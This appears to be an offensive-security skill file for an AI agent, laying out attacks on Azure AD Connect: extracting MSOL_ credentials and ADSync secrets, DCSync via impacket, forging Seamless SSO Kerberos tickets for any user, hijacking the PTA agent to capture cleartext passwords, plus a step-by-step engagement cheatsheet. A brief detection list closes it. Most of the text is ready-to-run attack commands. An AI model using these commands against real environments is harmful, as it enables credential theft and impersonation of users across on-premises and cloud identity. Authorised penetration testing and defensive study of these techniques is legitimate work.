---
name: offensive-aadconnect-attacks
description: "Hybrid identity attacks via Azure AD Connect — Password Hash Sync (PHS) extraction, Pass-Through Authentication (PTA) agent hijack, Seamless SSO (forge AZUREADSSOACC$ Kerberos ticket), MSOL_ account abuse for DCSync on-prem, and ADSync database secret extraction. Use when AAD Connect is in scope or compromised — provides the bridge between on-prem AD and Entra ID."
---

# AAD Connect Attacks

## MSOL_ Account → DCSync

AAD Connect creates an `MSOL_*` account with DCSync rights for password hash sync.

```bash
# On the AAD Connect server (admin context)
Get-AADIntADSyncCredentials   # AADInternals — extracts MSOL_ creds + Sync DB key

# Then DCSync as MSOL_
impacket-secretsdump corp.local/MSOL_acct:pass@dc -just-dc-ntlm
```

## ADSync DB

```bash
# AAD Connect stores synced credentials in encrypted form in ADSync SQL DB
# Localhost SQL instance: server\ADSYNC

sqlcmd -S "<server>\ADSYNC" -d ADSync \
  -Q "SELECT * FROM mms_management_agent"
```

The encryption key is on the same server. Get-AADIntADSyncCredentials retrieves both.

## PHS Extraction

```powershell
# AADInternals
Set-AADIntADSyncRunProfile
Get-AADIntADSyncCredentials
```

PHS-synced password hashes can be retrieved from the AAD Connect server and used for cloud authentication.

## PTA Agent Hijack

PTA (Pass-Through Authentication) runs on the AAD Connect server (or dedicated agent). It validates user passwords against on-prem AD.

```powershell
# DLL hijack: replace Microsoft.Azure.SecurityTokenService.dll variant
# Or hook the agent process to capture cleartext passwords as they flow through
```

Result: cleartext capture of every successful AAD authentication where PTA validates.

## Seamless SSO — Forge AZUREADSSOACC$ Tickets

Seamless SSO uses a computer account `AZUREADSSOACC$` whose Kerberos hash is fixed (no rotation). Compromise allows forging Kerberos tickets for cloud SSO.

```powershell
# Get AZUREADSSOACC$ NT hash via DCSync
impacket-secretsdump -just-dc-user 'corp/AZUREADSSOACC$' corp/admin@dc -hashes :<admin-hash>

# Forge ticket for any user
$ticket = Rubeus.exe asktgt /user:victim /rc4:<AZUREADSSOACC-hash> /service:HTTP/autologon.microsoftazuread-sso.com

# User cloud SSO succeeds as victim
```

## Federated Trust (ADFS) → Golden SAML

When the tenant is federated (ADFS), compromise of the ADFS token-signing cert enables Golden SAML — see `offensive-golden-saml`.

## Engagement Cheatsheet

```bash
# 1. Identify AAD Connect server
nltest /dsgetdc:corp.local
Get-Service ADSync   # on candidate hosts

# 2. Compromise the host (any admin path works)

# 3. Extract hybrid identity material
Get-AADIntADSyncCredentials

# 4. Pivots:
#    - DCSync via MSOL_
#    - PHS hashes for cloud auth
#    - PTA hook for cleartext capture
#    - AZUREADSSOACC$ for Seamless SSO ticket forgery

# 5. Document each pivot's reach
```

## Detection

- ADSync log entries for unusual queries
- Defender for Identity flags AZUREADSSOACC$ Kerberos use anomalies
- Azure AD Identity Protection on cloud-side use

## Key References

- AADInternals: aadinternals.com
- "Hybrid Identity Hacks" (Dirk-jan Mollema, Nestori Syynimaa)
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/aadconnect.md
